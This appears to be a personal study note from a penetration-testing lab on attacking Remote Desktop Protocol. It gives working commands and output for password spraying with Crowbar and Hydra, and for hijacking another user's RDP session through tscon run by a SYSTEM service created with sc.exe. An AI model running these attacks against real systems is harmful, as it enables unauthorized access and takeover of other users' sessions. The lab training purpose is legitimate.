Remote Desktop Protocol

By default, RDP runs on TCP/3389

### Misconfigurations
- One common attack vector against an RDP Service is password guessing. 
- Although uncommon, we could find an RDP service without a password configuration. 

Using the **Crowbar** tool, we can perform a password spraying attack against an RDP service. 

```shell-session
realCustampin@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```
- Using the password 'password123' we can use a list of usernames along with that to conduct a password spray against the target. 


**Using Hydra**
```shell-session
realCustampin@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```
- We can also use Hydra to conduct the same attack. 

### Protocol Specific Attacks

![[Pasted image 20251102125032.png]]
- In the powershell window above, we see that we are logged in as juurena right now. Objective here is to hijack lewen session. 

To successfully complete this task without a username or password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. 

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

You can see here that we are creating a windows service that will run as Local System by default and will execute any binary with SYSTEM privileges. 
```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

To run the newly created service, we pass the following command: 
```cmd-session
C:\htb> net start sessionhijack
```

![[Pasted image 20251102125600.png]]
- And now we have a session open as the user lewen

